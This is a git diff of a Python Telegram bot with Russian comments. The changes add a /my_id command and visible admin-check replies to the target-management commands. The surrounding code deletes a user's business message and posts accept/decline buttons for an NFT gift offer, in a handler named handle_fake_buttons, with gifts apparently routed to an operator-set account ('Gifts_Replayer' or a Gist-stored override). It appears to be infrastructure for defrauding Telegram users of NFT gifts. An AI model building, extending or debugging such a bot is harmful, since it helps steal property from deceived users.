@@ -21,7 +21,7 @@ try:
 except ValueError:
     ADMIN_ID = 0
 
-# Стандартный получатель (если для пользователя не задан кастомный)
+# Стандартный получатель
 DEFAULT_TARGET = "Gifts_Replayer"
 
 bot = Bot(token=BOT_TOKEN)
@@ -110,12 +110,22 @@ async def update_gist_data(new_data: dict):
     except Exception as e:
         return False, f"Ошибка сети: {e}"
 
-# --- АДМИН ПАНЕЛЬ ---
+# --- АДМИН ПАНЕЛЬ С ПРОВЕРКОЙ ---
+@dp.message(Command("my_id"))
+async def cmd_my_id(message: types.Message):
+    await message.answer(f"Ваш ID: <code>{message.from_user.id}</code>\nID Админа в боте: <code>{ADMIN_ID}</code>", parse_mode="HTML")
+
 @dp.message(Command("set_target"))
 async def cmd_set_target(message: types.Message):
-    # Проверка на админа (если ID не совпадает - выходим)
+    # ЖЕСТКАЯ ПРОВЕРКА НА АДМИНА
     if message.from_user.id != ADMIN_ID:
-        return
+        return await message.answer(
+            f"❌ <b>Отказано в доступе.</b>\n\n"
+            f"Ваш ID: <code>{message.from_user.id}</code>\n"
+            f"Ожидается (ADMIN_ID): <code>{ADMIN_ID}</code>\n\n"
+            f"Если вы админ, убедитесь, что в настройках GitHub Secrets добавлен правильный <code>ADMIN_ID</code>.",
+            parse_mode="HTML"
+        )
     
     parts = message.text.split()
     if len(parts) != 3:
@@ -139,7 +149,7 @@ async def cmd_set_target(message: types.Message):
 @dp.message(Command("remove_target"))
 async def cmd_remove_target(message: types.Message):
     if message.from_user.id != ADMIN_ID:
-        return
+        return await message.answer(f"❌ Вы не админ. Ваш ID: {message.from_user.id}")
     
     parts = message.text.split()
     if len(parts) != 2:
@@ -162,7 +172,7 @@ async def cmd_remove_target(message: types.Message):
 @dp.message(Command("test_db"))
 async def cmd_test_db(message: types.Message):
     if message.from_user.id != ADMIN_ID:
-        return
+        return await message.answer(f"❌ Вы не админ. Ваш ID: {message.from_user.id}")
     
     data, error = await get_gist_data()
     if error:
@@ -231,13 +241,11 @@ async def handle_offer_command(message: types.Message):
         target_username=DEFAULT_TARGET
     )
 
-    # Берем ник отправителя для базы данных
     sender_username = message.from_user.username.lower() if message.from_user.username else "no_username"
 
     try:
         await bot.delete_business_messages(business_connection_id=business_connection_id, message_ids=[message.message_id])
         
-        # Передаем username в callback_data
         keyboard = InlineKeyboardMarkup(inline_keyboard=[[
             InlineKeyboardButton(text=msg_data["btn_decline"], callback_data=f"decline:{gift_slug}:{amount}:{currency}:{lang}:{sender_username}"),
             InlineKeyboardButton(text=msg_data["btn_accept"], callback_data=f"accept:{gift_slug}:{amount}:{currency}:{lang}:{sender_username}")
@@ -264,13 +272,11 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     
     symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
     
-    # Получаем кастомный юзернейм из Gist
     data, error = await get_gist_data()
     target_username = DEFAULT_TARGET
     if data and not error:
         target_username = data.get(sender_username, DEFAULT_TARGET)
 
-    # Cache-buster для обновления анимации на телефоне
     cache_buster = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
     link = f"https://t.me/nft/{gift_slug}?v={cache_buster}"
     
